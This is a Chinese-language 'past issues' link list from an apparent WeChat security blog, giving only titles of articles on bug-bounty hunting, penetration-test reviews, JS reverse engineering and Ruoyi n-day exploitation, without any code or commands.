**往期回顾**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[手把手js逆向断点调试&js逆向前端加密对抗&企业SRC实战分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247495361&idx=1&sn=48283073b325e360823da8dec27a7508&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[浅谈src漏洞挖掘中容易出洞的几种姿势](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247489731&idx=1&sn=c3a5ef01648fad496ecda36b653b6e21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[HVV护网行动 | 分享最近攻防演练HVV漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247488672&idx=1&sn=493bb70011a02eb971ff1b74c733f1d9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[攻防演练｜分享最近一次攻防演练RTSP奇特之旅](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492377&idx=1&sn=a94ad30e30e08bd96e888dad744e9814&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[JS漏洞挖掘｜分享使用FindSomething联动的挖掘思路](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492315&idx=1&sn=88991e98058a277e267a9a79b8518e16&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 从jeecg接口泄露到任意管理员用户接管+SQL注入漏洞](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493292&idx=1&sn=611fd43361089a30e5f7bcda21274b95&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[分享SRC中后台登录处站点的漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247485439&idx=1&sn=3fd7e4cef57edca8e73104f8af38fc05&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[企业SRC支付漏洞&EDUSRC&众测挖掘思路技巧操作分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492839&idx=1&sn=b9781f60580c1da8e2151166f0494ba5&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 分享某次项目上的渗透测试漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493495&idx=1&sn=791bebc6faa651cc3c585c2f5f481d21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】分享云安全浪潮src漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494877&idx=1&sn=2d00c0f651fd7375e881be86638e53ce&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[实战SRC挖掘｜微信小程序渗透漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494468&idx=1&sn=f0da4b4ff7763cbb83b858fb5a8964f9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[综合资产测绘 | 手把手带你搞定信息收集](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493749&idx=1&sn=d2e0febcdcf9dcd8aa44be0d43b51936&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】针对若依系统nday的常见各种姿势利用](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493489&idx=1&sn=d3ef10a1ae3b8c161d7174cb42702fac&scene=21#wechat_redirect)  
  
  
  
